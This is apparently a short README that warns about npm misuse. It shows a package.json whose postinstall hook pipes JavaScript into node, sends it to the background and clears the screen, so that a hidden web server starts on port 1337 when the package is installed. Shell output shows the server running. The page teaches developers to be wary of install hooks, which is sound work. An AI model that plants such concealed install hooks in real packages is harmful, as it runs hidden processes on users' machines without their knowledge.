# don't do bad things with node

Node.js as a young technology is great but also great for misuse. Go (!) and support (!) **[THE NODE SECURITY PROJECT](http://nodesecurity.io/)**

# about this repo

Here I am showing misuse to make you (and me) more mindful. It is easy, just look insight the code of others, support projects like the node security project and do good things!

Let's dive into some code:

# NPM MISUSE #1

NPM is so great! [Isaac](https://github.com/isaacsâ€Ž) did a great job! But, you have to use it mindful. Look at the following example, it is a minimal npm `package.json` **but** if I write it like this, I am able to do whatever I want on your system if you are going to install my package. Like starting a webserver on port `1337` **and hiding it from you**.

```json
{
  "name": "test",
  "scripts": {
    "postinstall": "echo 'var http=require(\"http\");http.createServer(function (req, res) {res.writeHead(200, {\"Content-Type\": \"text/plain\"}); res.end(\"hi, i just started a background http server at your system. You should be patient! \");}).listen(1337);//console.log(\"Server running at http://127.0.0.1:1337/\")' | node & clear;"
  }
}
```


```shell
$ ps
  PID TTY           TIME CMD
  586 ttys000    0:00.55 /bin/zsh
  903 ttys001    0:00.07 /bin/zsh

$ npm install
$ 

$ ps
  PID TTY           TIME CMD
  586 ttys000    0:00.56 /bin/zsh
 1555 ttys000    0:00.05 node
  903 ttys001    0:00.07 /bin/zsh

$ curl localhost:1337
hi, i just started a background http server at your system. You should be patient! %
```

as you can see, I am piping a text string to node, putting the node process into the background and clearing the screen. So, please be mindful and support security projects.
